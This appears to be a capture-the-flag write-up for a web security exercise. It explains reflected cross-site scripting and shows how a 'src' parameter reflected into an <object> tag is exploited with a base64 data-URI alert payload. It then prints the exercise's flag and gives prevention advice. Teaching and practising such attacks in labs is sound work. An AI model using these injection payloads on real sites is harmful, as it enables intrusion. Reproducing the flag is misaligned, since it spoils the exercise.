# Definition XSS (Cross Site Scripting)

Cross-site Scripting (XSS) is a security vulnerability usually found in websites and/or web applications that accept user input. Examples of these include search engines, login forms, message boards and comment boxes.  
Cybercriminals exploit this vulnerability by inputting strings of executable malicious code into these functions. This injects the malicious code into the targeted website’s content, making it a part of the website and thus allowing it to affect victims who may visit or view that website. The code may also present itself as transient content that isn’t actually part of the website but only appears to be to the visitor. This makes it look like the website is indeed compromised by cybercriminals.

## What is a reflected XSS attack

Reflected XSS attacks, also known as non-persistent attacks, occur when a malicious script is reflected off of a web application to the victim’s browser.  
The script is activated through a link, which sends a request to a website with a vulnerability that enables execution of malicious scripts. The vulnerability is typically a result of incoming requests not being sufficiently sanitized, which allows for the manipulation of a web application’s functions and the activation of malicious scripts.

# Steps

By visiting `http://IP_ADDRESS/?page=media&src=nsa` the page display `nsa_prism.jpg`  
What if we change src in url to anything ,what's happen?  
So we send `http://IP_ADDRESS/?page=media&src=hello`  
the output was `Sorry wrong answer`, but if we search for `hello` in the content og html we find that's live in data inside `<object>`  
What's `<object>`:

```
The <object> tag defines a container for an external resource.
The external resource can be a web page, a picture, a media player, or a plug-in application.
data attribute:
Specifies the URL of the resource to be used by the object
```

So we assign src with data URI scheme  
The data URI scheme is a uniform resource identifier (URI) scheme that provides a way to include data in-line in Web pages as if they were external resources.

```
syntax:
data:[<mediatype>][;base64],<data>
```

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=
// 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=' = <script>alert(1)</script>
```

and we find the flag!!

# Flag: 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D

# Prevent XSS

To keep yourself safe from XSS, you must sanitize your input. Your application code should never output data received as input directly to the browser without checking it for malicious code.

# Resources

### [XSS OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

### [XSS Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)

### [XSS Exercise 1](https://www.hacksplaining.com/exercises/xss-stored)

### [XSS Exercise 2](https://application.security/free-application-security-training/cross-site-scripting-vulnerability-in-tiktok)
